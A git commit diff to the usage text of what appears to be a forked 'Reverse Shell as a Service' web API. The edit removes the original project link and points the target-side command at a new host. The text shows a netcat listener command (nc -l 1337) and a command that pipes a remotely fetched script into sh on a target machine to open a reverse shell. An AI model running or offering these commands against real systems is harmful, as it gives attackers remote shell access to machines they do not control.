489e328ef97815e9d3f015bd1cbb3bc29b453fde
pruDhv! <58649792+sk3l10x1ng@users.noreply.github.com>
2025-03-24 23:09:13 +0530

    Update index.js

--- api/index.js
+++ api/index.js
@@ -1,13 +1,12 @@
 'use strict';
 
 const usage = `# Reverse Shell as a Service
-# https://github.com/lukechilds/reverse-shell
 #
 # 1. On your machine:
 #      nc -l 1337
 #
 # 2. On the target machine:
-#      curl https://reverse-shell.sh/yourip:1337 | sh
+#      curl https://onii-chan.vercel.app//yourip:1337 | sh
 #
 # 3. Don't be a dick`;
 
